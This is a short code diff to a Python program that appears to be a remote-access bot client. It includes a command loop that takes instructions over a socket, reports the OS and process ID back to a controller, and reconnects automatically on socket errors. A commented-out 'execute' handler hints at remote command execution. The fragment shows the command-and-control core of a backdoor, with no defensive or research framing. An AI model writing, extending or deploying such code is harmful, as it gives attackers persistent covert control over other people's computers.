@@ -10,6 +10,7 @@ import pyautogui
 from json import load
 from urllib import request
 
+#Useless func
 def create_botserver():
     ip = load(request.urlopen("https://api.ipify.org/?format=json"))['ip']
     port = 2000
@@ -33,6 +34,10 @@ def start_session(s):
     while True:
         try:
             cmd = s.recv(1024).decode()
+
+            if "pid" in cmd:
+                pid = str(os.getpid())
+                s.send(pid.encode())
 
             if "OS" in cmd:
                 os_name = platform.system()
@@ -113,8 +118,10 @@ def start_session(s):
         #    if "execute" in cmd:
         #        cmd = cmd.strip("execute ")
 
+        except socket.error:
+            main()
         except Exception as e:
-            print(str(e))
+            print("Error : %s"%(str(e)))
 
 def main():
     while True:
